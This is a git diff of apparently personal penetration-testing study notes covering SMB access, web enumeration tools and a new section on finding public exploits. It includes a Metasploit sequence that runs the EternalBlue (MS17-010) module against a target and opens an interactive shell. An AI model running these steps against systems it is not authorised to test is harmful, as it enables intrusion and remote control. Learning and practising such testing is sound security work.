@@ -74,7 +74,7 @@ If you need to do it in the contex of a user the following works but also will p
 smbclient -U bob \\\\10.129.43.253\users
 ```
 ---
-#### **Web Eumeration**
+#### Web Eumeration
 
 **Gobuster** - Versatile tool that can perform DNS, vhost, and directory brute-forcing. Can also enumerate public AWS S3 buckets. 
 Usage - directory bruteforce mode.
@@ -111,3 +111,33 @@ whatweb 10.1.10.121
 **Robots.txt** - This instructs the search engine web crawlers, like googlebot which rescource can and cannot be accessed for indexing. 
 
 **Source Code** - The source code of a site might have mistakes by a developer leaving comments in the code for a test account ect.
+##### Public Exploits
+Once services have been identified via NMAP scan, we want to ensure wether or not they have public exploits available. First off just google the service version and exploit is the lowest hanging fruit. Other exploit sites are **Exploit DB**, **Rapid7 DB**, or **vulnerability lab**.
+
+**searchsploit** - can be used to find exploits via bash shell. 
+
+Installation
+```bash
+sudo apt install exploitdb -y
+```
+usage - search for an exploit and version
+```bash
+searchsploit openssh 7.2
+```
+**Metasploit** - can also be used to search exploits and quickly plug them in and use them.
+usage - in metasploit console
+```bash
+msfconsole
+search exploit eternalblue
+use exploit/windows/smb/ms17_010_psexec
+show options
+set RHOST <target>
+set LHOST <tun0>
+check (check if vuln)
+exploit (execute exploit)
+getuid (check privs)
+shell (get interactive shell)
+```
+
+###### Types of Shells
+**Reverse Shell** - Sends a shell back to a listener port
